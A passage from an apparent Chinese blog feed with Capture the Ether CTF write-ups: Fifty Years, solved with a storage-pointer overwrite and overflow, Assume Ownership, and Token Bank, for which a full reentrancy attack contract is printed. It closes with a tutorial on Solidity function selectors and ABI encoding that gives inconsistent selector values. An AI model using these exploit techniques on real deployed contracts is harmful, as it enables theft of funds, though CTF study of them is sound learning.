  address owner;</span><br><span class="line">    function FiftyYearsChallenge(address player) public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line"></span><br><span class="line">        owner = player;</span><br><span class="line">        queue.push(Contribution(msg.value, now + 50 years));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function upsert(uint256 index, uint256 timestamp) public payable &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line"></span><br><span class="line">        if (index &gt;= head &amp;&amp; index &lt; queue.length) &#123;</span><br><span class="line">            // Update existing contribution amount without updating timestamp.</span><br><span class="line">            Contribution storage contribution = queue[index];</span><br><span class="line">            contribution.amount += msg.value;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // Append a new contribution. Require that each contribution unlock</span><br><span class="line">            // at least 1 day after the previous one.</span><br><span class="line">            require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days);</span><br><span class="line"></span><br><span class="line">            contribution.amount = msg.value;</span><br><span class="line">            contribution.unlockTimestamp = timestamp;</span><br><span class="line">            queue.push(contribution);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 index) public &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        require(now &gt;= queue[index].unlockTimestamp);</span><br><span class="line"></span><br><span class="line">        // Withdraw this and any earlier contributions.</span><br><span class="line">        uint256 total = 0;</span><br><span class="line">        for (uint256 i = head; i &lt;= index; i++) &#123;</span><br><span class="line">            total += queue[i].amount;</span><br><span class="line"></span><br><span class="line">            // Reclaim storage.</span><br><span class="line">            delete queue[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Move the head of the queue forward so we don&#x27;t have to loop over</span><br><span class="line">        // already-withdrawn contributions.</span><br><span class="line">        head = index + 1;</span><br><span class="line"></span><br><span class="line">        msg.sender.transfer(total);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Fifty years 综合考察了 math 系列的知识点，完成挑战的条件是将合约中的钱全部转出。</p><ol><li><p>调用 withdraw 函数中的 transfer 方法可以将合约中的钱全部转出，调用 withdraw 时需要<code>withdraw(queue.lengtht - 1)</code>，即取最后一笔的时候会把之前的存款加起来一次性取出；</p></li><li><p>执行 withdraw 函数时需要满足<code>require(now &gt;= queue[index].unlockTimestamp)</code>，在构造函数中的结构体数组的第一个元素为 <code>now + 50 years</code>，后面每一次插入新元素解锁时间都会再加一天，所以 now 至少应该大于50年以后；</p></li><li><p>所以如果要调用 transfer 方法就需要绕过 timestamp 的检查，由于 storage 中的存储布局如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---------------------------------------------------</span><br><span class="line">|                    queue.length                 | &lt;- slot 0</span><br><span class="line">---------------------------------------------------</span><br><span class="line">|                      head                       | &lt;- slot 1</span><br><span class="line">---------------------------------------------------</span><br><span class="line">|                      owner                      | &lt;- slot 2</span><br><span class="line">---------------------------------------------------</span><br><span class="line">|                      ......                     | </span><br><span class="line">---------------------------------------------------</span><br><span class="line">|                      msg.value                  | &lt;- slot keccak256(0)</span><br><span class="line">---------------------------------------------------</span><br><span class="line">|                    now + 50 year                | &lt;- slot keccak256(0) + 1</span><br><span class="line">---------------------------------------------------</span><br></pre></td></tr></table></figure><p>根据存储布局分析，在 upsert 中构造溢出，利用未初始化存储指针漏洞，当 struct 未被赋初值时不占用 slot，在upsert 函数中被赋值后会覆盖 <code>queue.length 和 head</code>，即 覆盖掉 slot 0 和 slot 1，即最终的存储结构为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---------------------------------------------------</span><br><span class="line">|       contribution.amount = msg.value           | &lt;- slot 0</span><br><span class="line">---------------------------------------------------</span><br><span class="line">|    contribution.unlockTimestamp = timestamp     | &lt;- slot 1</span><br><span class="line">---------------------------------------------------</span><br><span class="line">|                      owner                      | &lt;- slot 2</span><br><span class="line">---------------------------------------------------</span><br><span class="line">|                      ......                     | </span><br><span class="line">---------------------------------------------------</span><br><span class="line">|                      msg.value                  | &lt;- slot keccak256(0)</span><br><span class="line">---------------------------------------------------</span><br><span class="line">|                    now + 50 year                | &lt;- slot keccak256(0) + 1</span><br><span class="line">---------------------------------------------------</span><br></pre></td></tr></table></figure><p>被覆盖以后会改变<code>queue[head]</code>的值，即覆盖掉<code>queue[0].unlockTimestamp</code>。</p></li><li><p>在<code>upset()</code>函数中的 if 语句的<code>upset(0, timestamp)</code>不会改变 timestamp，只会更新 amount，只有当<code>timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days</code>时才会执行 else 语句，如果能使<code>queue[queue.length - 1].unlockTimestamp == 2**256 - 1</code>，就会造成上溢出，加上后边的 1，就等于 0 了，然后将 <code>timestamp = 0</code>传入，绕过 <code>withdraw()</code>函数的 require 要求。</p></li></ol><p>解题步骤：</p><ol><li><p>调用 <code>upsert()</code>函数 将 index，timestamp 参数分别设置为<code>1, 2**256 -1</code>，由于在代码中的 1 应该是以为妙为单位，所以这里需要进行单位转换，<code>1 day =  24*60*60=86400s</code>，构造溢出 <code>timestamp = queue[queue.length - 1].unlockTimestamp + 1 days </code>，即<code>queue[queue.length - 1].unlockTimestamp + 86400 = 2**256</code>，所以需要传入的参数为 115792089237316195423570985008687907853269984665640564039457584007913129553536</p><p><img src="/image/capturetheether.assets/image-20220326222312412.png" alt="image-20220326222312412"></p><p>会将<code>queue.length ，head</code>分别覆盖为<code>1,115792089237316195423570985008687907853269984665640564039457584007913129553536</code></p></li><li><p>调用 <code>upsert()</code>函数 将 index，timestamp 参数分别设置为<code>2, 0</code>,此时<code>queue.length，head</code>分别被覆盖为<code>2,0</code>，timestamp + 1 后溢出为 0，绕过<code>timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days</code>判断，所以现在绕过 withdraw 限制；</p></li><li><p>调用函数 <code>withdraw(1)</code>，只需要取出 index 1之前的即可。</p></li></ol><h3 id="Assume-ownership"><a href="#Assume-ownership" class="headerlink" title="Assume ownership"></a>Assume ownership</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract AssumeOwnershipChallenge &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    function AssumeOwmershipChallenge() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function authenticate() public &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line"></span><br><span class="line">        isComplete = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>杂项的第一道题比较简单，只需要先调用<code>AssumeOwmershipChalleng</code>函数成为 owner，然后再调用<code>authenticate</code>函数就可以完成题目。</p><h3 id="Token-Bank"><a href="#Token-Bank" class="headerlink" title="Token Bank"></a>Token Bank</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">interface ITokenReceiver &#123;</span><br><span class="line">    function tokenFallback(address from, uint256 value, bytes data) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleERC223Token &#123;</span><br><span class="line">    // Track how many tokens are owned by each address.</span><br><span class="line">    mapping (address =&gt; uint256) public balanceOf;</span><br><span class="line">    string public name = &quot;Simple ERC223 Token&quot;;</span><br><span class="line">    string public symbol = &quot;SET&quot;;</span><br><span class="line">    uint8 public decimals = 18;</span><br><span class="line">    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);</span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line">    function SimpleERC223Token() public &#123;</span><br><span class="line">        balanceOf[msg.sender] = totalSupply;</span><br><span class="line">        emit Transfer(address(0), msg.sender, totalSupply);</span><br><span class="line">    &#125;</span><br><span class="line">    function isContract(address _addr) private view returns (bool is_contract) &#123;</span><br><span class="line">        uint length;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            //retrieve the size of the code on target address, this needs assembly</span><br><span class="line">            length := extcodesize(_addr)</span><br><span class="line">        &#125;</span><br><span class="line">        return length &gt; 0;</span><br><span class="line">    &#125;</span><br><span class="line">    function transfer(address to, uint256 value) public returns (bool success) &#123;</span><br><span class="line">        bytes memory empty;</span><br><span class="line">        return transfer(to, value, empty);</span><br><span class="line">    &#125;</span><br><span class="line">    function transfer(address to, uint256 value, bytes data) public returns (bool) &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= value);</span><br><span class="line">        balanceOf[msg.sender] -= value;</span><br><span class="line">        balanceOf[to] += value;</span><br><span class="line">        emit Transfer(msg.sender, to, value);</span><br><span class="line">        if (isContract(to)) &#123;</span><br><span class="line">            ITokenReceiver(to).tokenFallback(msg.sender, value, data);</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint256 value);</span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;</span><br><span class="line">    function approve(address spender, uint256 value)</span><br><span class="line">        public</span><br><span class="line">        returns (bool success)</span><br><span class="line">    &#123;</span><br><span class="line">        allowance[msg.sender][spender] = value;</span><br><span class="line">        emit Approval(msg.sender, spender, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    function transferFrom(address from, address to, uint256 value)</span><br><span class="line">        public</span><br><span class="line">        returns (bool success)</span><br><span class="line">    &#123;</span><br><span class="line">        require(value &lt;= balanceOf[from]);</span><br><span class="line">        require(value &lt;= allowance[from][msg.sender]);</span><br><span class="line"></span><br><span class="line">        balanceOf[from] -= value;</span><br><span class="line">        balanceOf[to] += value;</span><br><span class="line">        allowance[from][msg.sender] -= value;</span><br><span class="line">        emit Transfer(from, to, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TokenBankChallenge &#123;</span><br><span class="line">    SimpleERC223Token public token;</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line"></span><br><span class="line">    function TokenBankChallenge(address player) public &#123;</span><br><span class="line">        token = new SimpleERC223Token();</span><br><span class="line"></span><br><span class="line">        // Divide up the 1,000,000 tokens, which are all initially assigned to</span><br><span class="line">        // the token contract&#x27;s creator (this contract).</span><br><span class="line">        balanceOf[msg.sender] = 500000 * 10**18;  // half for me</span><br><span class="line">        balanceOf[player] = 500000 * 10**18;      // half for you</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return token.balanceOf(this) == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function tokenFallback(address from, uint256 value, bytes) public &#123;</span><br><span class="line">        require(msg.sender == address(token));</span><br><span class="line">        require(balanceOf[from] + value &gt;= balanceOf[from]);</span><br><span class="line"></span><br><span class="line">        balanceOf[from] += value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= amount);</span><br><span class="line"></span><br><span class="line">        require(token.transfer(msg.sender, amount));</span><br><span class="line">        balanceOf[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>杂项的第二道题， TokenBankChallenge 合约就相当于一个银行，玩家一开始会有 500000 eth 的余额，可以通过 withdraw 使用这部分余额购买使用 SimpleERC223Token 实现的 Token，银行持有的 Token 为 1000000 ether，通过该题目的条件是让银行合约持有的 Token 清零。</p><p>注意代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (isContract(to)) &#123;</span><br><span class="line">            ITokenReceiver(to).tokenFallback(msg.sender, value, data);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>这里判断 to 地址是否为合约地址，如果是合约地址的话就用 ITokenReceiver 接口来调用 to 合约的 tokenFallback 函数，tokenFallback 函数回更改目标的 balance，但是由于这里的 to 地址可控，所以存在 <strong>任意外部调用类型漏洞</strong>，只需要在攻击合约中命令一个 tokenFallback 函数，就可以在 transfer 的执行过程中额外调用攻击合约的函数，又因为在 withdraw 函数中 对 <code>token.transfer</code>的调用在 require 函数中，所以这里还存在重入漏洞。</p><p>整个的攻击思路为：</p><p>​    部署一个攻击合约，将 player 的 Token 转让给这个合约，攻击合约再把 Token 转化为银行的 balance，可以以合约身份执行 withdraw 函数，触发重入。</p><p>调用<code>token.transfer</code>函数后余额会更新，允许重复提取存入的资金，重入的控制流程是：<code>challenge.withdraw =&gt; token.transfer =&gt; msg.sender.tokenFallback() =&gt; ... repeat until empty</code></p><p>攻击合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    address addr_TokenBankChallenge = 0xD8555E9A128C07928C1429D834640372C8381828;</span><br><span class="line">    address addr_SimpleERC223Token  = 0x8D8ACb16e0FAec90e078123FAfa0F2a7e759B556;</span><br><span class="line">    TokenBankChallenge TokenBank;</span><br><span class="line">    SimpleERC223Token SimpleERC223;</span><br><span class="line">    uint256 check;</span><br><span class="line">    function Attack() payable&#123;</span><br><span class="line">        TokenBank = TokenBankChallenge(addr_TokenBankChallenge);</span><br><span class="line">        SimpleERC223 = SimpleERC223Token(addr_SimpleERC223Token);</span><br><span class="line">    &#125;</span><br><span class="line">    function action1() public &#123;</span><br><span class="line">        SimpleERC223.transferFrom(0x78731D3Ca6b7E34aC0F824c42a7cC18A495cabaB,address(this),500000000000000000000000);</span><br><span class="line">    &#125;</span><br><span class="line">    function action2() public &#123;</span><br><span class="line"></span><br><span class="line">        SimpleERC223.transfer(addr_TokenBankChallenge,500000000000000000000000);</span><br><span class="line">    &#125;</span><br><span class="line">    function tokenFallback(address from, uint256 value, bytes) public &#123;</span><br><span class="line">        check=check+1;</span><br><span class="line">        if(check &lt;= 2)&#123;</span><br><span class="line">        TokenBank.withdraw(500000 * 10**18);    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function () public payable &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>初始 player 的账户的余额为：<code>500000000000000000000000</code>，首先调用 withdraw 函数把 player 的余额全部转换成 SimpleERC223Token 中的 token<img src="/Users/banana69/blog/ctf/capturetheether.assets/image-20220401151218782.png" alt="image-20220401151218782"></p><p><img src="/image/capturetheether.assets/image-20220401151306973.png" alt="image-20220401151306973"></p></li><li><p>然后再调用 <code>SimpleERC223Token</code>合约中的 approve 函数，授权攻击合约可以使用所有的 token</p><p> <img src="/image/capturetheether.assets/image-20220401151456754.png" alt="image-20220401151456754"></p></li><li><p>调用攻击合约中的 action1 将原本 player 的 token  转移到智能合约的账户中</p><p> <img src="/image/capturetheether.assets/image-20220401151844688.png" alt="image-20220401151844688"></p><p> <img src="/image/capturetheether.assets/image-20220401151852050.png" alt="image-20220401151852050"></p></li></ol><ol start="4"><li><p>然后调用攻击合约中的 action2 ，即调用 transfer 函数向 <code>TokenBankChallenge</code> 合约将 token 转为 balance，但是由于在 transfer 函数中会判断转入的地址是否为合约地址，如果为合约地址的话会将 balance 退回到发起转账的账户，即退回到了攻击合约中，此时攻击合约的余额为<code>500000000000000000000000</code></p><p> <img src="/image/capturetheether.assets/image-20220401153046304.png" alt="image-20220401153046304"></p><p> <img src="/image/capturetheether.assets/image-20220401153107117.png" alt="image-20220401153107117"></p></li><li><p>最后调用攻击合约中的 tokenFallback 函数（参数任意），该函数中会调用 <code>TokenBankChallenge</code> 合约中的 withdraw 函数，而在 withdraw 函数中又会执行 <code>token.transfer(msg.sender，amount)</code>，且对余额的更新在执行 transfer 之后，所以这里就会造成重入漏洞，且在执行 transfer 时，<code>address to</code> 是一个可控的变量，为攻击合约的地址，在攻击合约中可以定义 tokenFallback 函数，当判断到地址 to 为合约地址时就会重入调用攻击合约中的 tokenFallback 函数，这里的 check 为控制 withdraw 函数执行俩次就可以将合约中的balance清零。</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Guess-the-secret-number&quot;&gt;&lt;a href=&quot;#Guess-the-secret-number&quot; class=&quot;headerlink&quot; title=&quot;Guess the secret number&quot;&gt;&lt;/a&gt;Guess the secret </summary>
      
    
    
    
    <category term="区块链" scheme="https://banana69.site/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
    <category term="智能合约" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>Solidity函数选择器与参数编码</title>
    <link href="https://banana69.site/2021/10/17/Solidity%20Function%20Selector/"/>
    <id>https://banana69.site/2021/10/17/Solidity%20Function%20Selector/</id>
    <published>2021-10-17T07:21:46.000Z</published>
    <updated>2022-07-28T06:41:27.781Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x01-Basic-Design"><a href="#0x01-Basic-Design" class="headerlink" title="0x01 Basic Design"></a>0x01 Basic Design</h4><p><strong>ABI (Application Binary Interface，应用二进制接口)</strong> 是以太坊生态系统中从区块链外部与合约进行交互以及合约间进行交互的一种方式。数据会根据其类型按照这份手册中说明的方法进行编码。</p><p>通常，ABI 是俩个程序模块之间的接口，其中之一通常处于机器代码级别，接口是将数据编码/解码到机器代码中(从机器代码中解码出来)的方法。在以太坊中，它是如何编码 Solidity 合约调用以及如何从交易中读取数据的基础。</p><h4 id="0x02-Function-Selector"><a href="#0x02-Function-Selector" class="headerlink" title="0x02 Function Selector"></a>0x02 Function Selector</h4><p>为了能够在以太坊上部署智能合约，合约函数被编译成 <strong>EVM</strong> 字节码，并添加了一段称为函数选择器的代码，作为合约代码的入口点。</p><p>一个函数调用数据的前 <strong>4</strong> 字节，指定了要调用的函数。这就是某个函数签名的 <strong>Keccak</strong> 哈希的前 4 字节（高位在左的大端序）。例如，<code>bytes4(keccak256(&#39;balanceOf(address)&#39;)) == 0x70a08231</code> 这种形式，<code>0x70a08231</code> 便是<code>balanceOf(address)</code>的 <strong>Function Selector</strong>。</p><ul><li>基础原型即是函数名称加上由括号括起来的参数类型列表，参数类型间由一个逗号分隔开，且没有空格；</li><li>对于 <strong>uint</strong> 类型，要转成 <strong>uint256</strong> 进行计算，比如 <code>ownerOf(uint256)</code> 其 <strong>Function Selector =</strong> <code>bytes4(keccak256(&#39;ownerOf(uint256)&#39;)) == 0x6352211e</code>；</li><li>函数参数包含结构体，相当于把结构体拆分成单个参数，只不过这些参数用 <code>()</code> 扩起来，详细可看下面的例子。</li></ul><p>给出以下例子：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity &gt;=0.4.16 &lt;0.9.0;</span><br><span class="line">pragma experimental ABIEncoderV2;</span><br><span class="line"></span><br><span class="line">contract Demo &#123;</span><br><span class="line">    struct Test &#123;</span><br><span class="line">        string name;</span><br><span class="line">        string policies;</span><br><span class="line">        uint num;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint public x;</span><br><span class="line">    function test1(bytes3) public &#123;x = 1;&#125;</span><br><span class="line">    function test2(bytes3[2] memory) public  &#123; x = 1; &#125;</span><br><span class="line">    function test3(uint32 x, bool y) public  &#123; x = 1; &#125;</span><br><span class="line">    function test4(uint, uint32[] memory, bytes10, bytes memory) public &#123; x = 1; &#125;</span><br><span class="line">    function test5(uint, Test memory test) public &#123; x = 1; &#125;</span><br><span class="line">    function test6(uint, Test[] memory tests) public &#123; x = 1; &#125;</span><br><span class="line">    function test7(uint[][] memory,string[] memory) public &#123; x = 1; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* 函数选择器</span><br><span class="line">&#123;</span><br><span class="line">    &quot;0d2032f1&quot;: &quot;test1(bytes3)&quot;,</span><br><span class="line">    &quot;2b231dad&quot;: &quot;test2(bytes3[2])&quot;,</span><br><span class="line">    &quot;92e92919&quot;: &quot;test3(uint32,bool)&quot;,</span><br><span class="line">    &quot;4d189ce2&quot;: &quot;test4(uint256,uint32[],bytes10,bytes)&quot;,</span><br><span class="line">    &quot;4ca373dc&quot;: &quot;test5(uint256,(string,string,uint256))&quot;,</span><br><span class="line">    &quot;ccc5bdd2&quot;: &quot;test6(uint256,(string,string,uint256)[])&quot;,</span><br><span class="line">    &quot;cc80bc65&quot;: &quot;test7(uint256[][],string[])&quot;,</span><br><span class="line">    &quot;0c55699c&quot;: &quot;x()&quot;</span><br><span class="line">&#125;</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//计算函数选择器</span><br><span class="line">function selector() public view returns (bytes4) &#123;</span><br><span class="line">return this.test1.selector;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h4 id="0x03-Argument-Encoding"><a href="#0x03-Argument-Encoding" class="headerlink" title="0x03 Argument Encoding"></a>0x03 Argument Encoding</h4><p>从第 <strong>5</strong> 个字节开始是被编码的参数。这种编码也被用在其他地方，比如，返回值和事件的参数也会被用同样的方式进行编码，而用来指定函数的 <strong>4</strong> 个字节则不需要再进行编码。</p><ul><li><p>基础类型：</p><ul><li><p><code>uint&lt; M &gt;</code> ： M 位的无符号整数，0 &lt; M &lt;= 256、M % 8 == 0；</p></li><li><p><code>int&lt; M &gt;</code>：以 2 为补码作为符号的 M 位整数，0 &lt; M &lt;= 256、M % 8 ==0；</p></li><li><p><code>address</code>：除了表示地址类型外，还等价于 uint160，在计算和函数选择器中通常使用 address；</p></li><li><p><code>bool</code>：等价于 uint8，取值为 0 或 1，在计算和函数选择器中通常使用 bool；</p></li><li><p><code>ixed&lt; M &gt;x&lt; N &gt;</code>：M 位的有符号固定小数位的是十进制数字，8 &lt;= M &lt;= 256、M % 8 == 0、且 0 &lt; N &lt;= 80，</p></li><li><p><code>fixed、ufixed</code>：fixed128x18 和 ufixed128x18 的同义词，在计算和函数选择器中通常使用 fixed128x18 和 ufixed128x18；</p></li><li><p><code>bytes&lt; M &gt;</code>：M 字节的二进制类型，0 &lt; M &lt;= 32；</p></li><li><p><code>function</code>：一个地址（20字节）后跟一个函数选择器（4字节），编码之后等价于bytes24.</p></li></ul></li><li><p>定长数组类型：</p><p><code>&lt; type &gt;[M]</code>：有 M 个元素的定长数组，M &gt;= 0，数组元素为给定类型。</p></li><li><p>非定长类型：</p><ul><li><code>bytes</code>：动态大小的字节序列。</li><li><code>string</code>：动态大小的 unicode 字符串，通常呈现为 UTF-8 编码。</li><li><code>&lt;type&gt;[]</code>：元素为给定类型的变长数组。</li></ul><p>可以将若干类型放到一对括号中，用逗号分隔开，以此来构成一个 元组tuple：</p><ul><li><code>(T1,T2,...,Tn)</code>：由 <code>T1</code>，…，<code>Tn</code>，<code>n &gt;= 0</code> 构成的 元组tuple。</li></ul></li></ul><ul><li><p>对参数的编码具有以下属性：</p><p>1、读取的次数取决于参数数组结构中的最大深度；也就是说，要取得 <code>a_i[k][l][r]</code> 需要读取 <strong>4</strong> 次。在先前的 <strong>ABI</strong> 版本中，在最糟的情况下，读取的次数会随着动态参数的总数而线性地增长。</p><p>2、一个变量或数组元素的数据，不会被插入其他的数据，并且是可以再定位的；也就是说，它们只会使用相对的 “地址”。</p></li><li><p>还需要区分静态和动态类型：</p><p>以下类型被称为<strong>动态</strong>：</p><ul><li><code>bytes</code></li><li><code>string</code></li><li>任意类型 T 的变长数组 <code>T[]</code></li><li>任意动态类型 T 的定长数组 <code>T[k]</code> （<code>k &gt;= 0</code>）</li><li>由动态的 <code>Ti</code> （<code>1 &lt;= i &lt;= k</code>）构成的 元组元组 <code>(T1,...,Tk)</code></li></ul><p>而所有非动态类型被称为<strong>静态</strong>。</p><p>静态类型会被直接编码，动态类型会在当前数据块之后单独分配的位置被编码。</p><p>参考动态类型的编码原理；<a href="https://ctf-wiki.org/blockchain/ethereum/selector-encoding/">https://ctf-wiki.org/blockchain/ethereum/selector-encoding/</a></p><ul><li>动态类型的数据，比如动态数组，结构体，变长字节，其编码后存储其<code>offset、length、data</code><ul><li>先把参数顺序存储：如果是定长数据类型，直接存储其 <code>data</code>，如果是变长数据类型，先存储其 <code>offset</code></li><li>顺序遍历变长数据：先存储 <code>offset</code>，对于第一个变长数据，先存储其 <code>offset = 0x20 * number</code> ( <code>number</code> 是函数参数的个数 )；对于下一个变长数据，其 <code>offset = offset_of_prev + 0x20 + 0x20 * number</code> (第一个 <code>0x20</code> 是存储前一个变长数据的长度占用的大小，<code>number</code> 是前一个变长数据的元素个数)</li><li>顺序遍历变长数据：存储完 <code>offset</code> ，接着就是遍历每个变长数据，分别存储其 <code>length</code> 和 <code>data</code></li><li>( <code>ps:</code> 对于结构体这样的类型，存储的时候可把结构体内元素看成是一个新函数的参数，这样的话，对于结构体中的第一个变长数据，其 <code>offset = 0x20 * num</code> ，<code>num</code> 是结构体元素的个数 )</li></ul></li></ul></li></ul><ul><li>一般来说大体而言，一个以 <code>a_1, ..., a_n</code> 为参数的对 <code>f</code> 函数的调用，会被编码<code>function_selector(f) enc((a_1, ..., a_n))</code>，<code>f</code> 的返回值 <code>v_1, ..., v_k</code> 会被编码为<code>enc((v_1, ..., v_k))</code>，也就是说，返回值会被组合为一个元组进行编码。</li></ul><h4 id="0x04-例子："><a href="#0x04-例子：" class="headerlink" title="0x04 例子："></a>0x04 例子：</h4><h6 id="例1："><a href="#例1：" class="headerlink" title="例1："></a>例1：</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity &gt;=0.4.16 &lt;0.9.0;</span><br><span class="line">pragma experimental ABIEncoderV2;</span><br><span class="line"></span><br><span class="line">contract Demo &#123;</span><br><span class="line">    struct Test &#123;</span><br><span class="line">        string name;</span><br><span class="line">        string policies;</span><br><span class="line">        uint num;</span><br><span class="line">    &#125;</span><br><span class="line">    uint public x;</span><br><span class="line">    function test(uint, uint32[] memory, bytes10, bytes memory) public &#123; </span><br><span class="line">    x = 1; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>针对以上合约的函数，其函数调用的最终编码为：</p><ul><li><p><code>test(0x123,[&quot;0x11221122&quot;,&quot;0x33443344&quot;],&quot;0x31323334353637383930&quot;,&quot;0x3132333435&quot;)</code></p><ul><li><p>函数选择器：<code>0xa5643bf2</code>，源自<code>test(uint,uint32,bytes10,bytes)</code>的签名；</p></li><li><p>第一个参数 <strong>uint</strong>（静态类型），直接存储其值：<code>0x0000000000000000000000000000000000000000000000000000000000000123</code>；</p></li><li><p>第二个参数 **uint32 []**（动态数组），先存储其 <strong>offset=0x20*4</strong>（4 是参数个数）：<code>0x0000000000000000000000000000000000000000000000000000000000000080</code>；</p></li><li><p>第三个参数 <strong>bytes10</strong>（静态类型），直接存储其值（从低位开始补0）：<code>0x313233343536373839300000000000000000000000000000000000000000000</code>；</p></li><li><p>第四个参数 <strong>bytes</strong>（动态类型），先存储其 <strong>offset=0x80+0x20*3=0xe0（需要加上前一个动态类型参数的offse，3是前一个动态类型存储其长度和俩个元素占用的插槽个数）</strong>：<code>0x00000000000000000000000000000000000000000000000000000000000000e0</code>;</p></li></ul></li><li><p>在存储完静态类型的 <strong>data</strong> 和动态类型的 <strong>offset</strong> 后，开始存储变长类型的 <strong>length</strong> 和 <strong>data</strong>：</p><ul><li>第二个参数的长度（<strong>length</strong>）：<code>0x0000000000000000000000000000000000000000000000000000000000000002</code>;</li><li>第二个参数的第一个数组元素：<code>0x0000000000000000000000000000000000000000000000000000000011221122</code>;</li><li>第二个参数的第二个数组元素：<code>0x0000000000000000000000000000000000000000000000000000000033443344</code>;</li><li>第四个参数的长度（<strong>length</strong>），5个字节：<code>0x0000000000000000000000000000000000000000000000000000000000000005</code>；</li><li>第四个参数的数据部分（从低位补0）：<code>0x3132333435000000000000000000000000000000000000000000000000000000</code>。</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x577563b6                                                             // function selector</span><br><span class="line">0 - 0x0000000000000000000000000000000000000000000000000000000000000123 // data of first parameter</span><br><span class="line">1 - 0x0000000000000000000000000000000000000000000000000000000000000080 // offset of second parameter</span><br><span class="line">2 - 0x3132333435363738393000000000000000000000000000000000000000000000 // data of third parameter</span><br><span class="line">3 - 0x00000000000000000000000000000000000000000000000000000000000000e0 // offset of forth parameter</span><br><span class="line">4 - 0x0000000000000000000000000000000000000000000000000000000000000002 // length of second parameter</span><br><span class="line">5 - 0x0000000000000000000000000000000000000000000000000000000011221122 // first data of second parameter</span><br><span class="line">6 - 0x0000000000000000000000000000000000000000000000000000000033443344 // second data of second parameter</span><br><span class="line">7 - 0x0000000000000000000000000000000000000000000000000000000000000005 // length of forth parameter</span><br><span class="line">8 - 0x3132333435000000000000000000000000000000000000000000000000000000 // data of forth parameter</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="例2："><a href="#例2：" class="headerlink" title="例2："></a>例2：</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">contract Foo &#123;</span><br><span class="line">  function bar(bytes3[2]) public pure &#123;&#125;</span><br><span class="line">  function baz(uint32 x, bool y) public pure returns (bool r) &#123; </span><br><span class="line">  r = x &gt; 32 || y; </span><br><span class="line">  &#125;</span><br><span class="line">  function sam(bytes, bool, uint[]) public pure 